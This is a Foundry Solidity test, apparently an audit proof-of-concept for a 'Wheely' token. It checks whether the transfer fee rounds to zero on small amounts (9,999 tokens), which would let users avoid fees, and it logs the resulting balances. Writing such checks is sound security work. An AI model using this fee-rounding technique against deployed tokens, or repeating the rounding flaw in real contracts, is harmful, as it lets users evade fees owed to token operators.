// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/Wheely.sol";

contract WheelyTest is Test {
    Wheely token;
    address owner = address(0x1);
    address alice = address(0x2);
    address bob = address(0x3);
    address feeAddress = address(0xFee);
    
    function setUp() public {
        vm.prank(owner);
        token = new Wheely("WheelyToken", "WHY", 18, 1e6, feeAddress);
    }

    function testFeeRoundingVulnerability() public {
        uint256 aliceAmount = 9999;

        vm.prank(owner);
        token.transfer(alice, aliceAmount);

        console.log("--- Before Trigger: Alice transferring to Bob ---");
        uint256 alicePreTransfer = token.balanceOf(alice);
        uint256 bobPreTransfer = token.balanceOf(bob);
        uint256 feePreTransfer = token.balanceOf(feeAddress);

        console.log("Alice's initial balance: ", alicePreTransfer);
        console.log("Bob's initial balance:   ", bobPreTransfer);
        console.log("Fee Address balance:     ", feePreTransfer);

        console.log("\n--- Trigger: Alice transferring ", alicePreTransfer, " tokens to Bob ---");
        vm.prank(alice);
        token.transfer(bob, alicePreTransfer);

        console.log("\n--- After Trigger: Transfer executed ---");
        uint256 alicePostTransfer = token.balanceOf(alice);
        uint256 bobPostTransfer = token.balanceOf(bob);
        uint256 feePostTransfer = token.balanceOf(feeAddress);

        console.log("Alice's final balance:   ", alicePostTransfer);
        console.log("Bob's received amount:   ", bobPostTransfer - bobPreTransfer);
        console.log("Fee collected:           ", feePostTransfer - feePreTransfer);
        console.log("Fee Address new balance: ", feePostTransfer);
        
        bool feeInvalid = (feePostTransfer - feePreTransfer) == 0;
        bool fullAmountTransfer = (bobPostTransfer - bobPreTransfer) == alicePreTransfer;
        bool zeroAliceBalance = alicePostTransfer == 0;
        
        console.log("\n--- Verification ---");
        console.log("Zero fee collected?        ", feeInvalid ? "YES" : "NO");
        console.log("Full amount transferred?   ", fullAmountTransfer ? "YES" : "NO");
        console.log("Alice balance cleared?     ", zeroAliceBalance ? "YES" : "NO");

        if (feeInvalid && fullAmountTransfer && zeroAliceBalance) {
            console.log("Vulnerability Exists: Fee calculation rounds to zero for small amounts");
        } else {
            console.log("Vulnerability not Exist: Expected behavior prevented fee avoidance");
        }
    }
}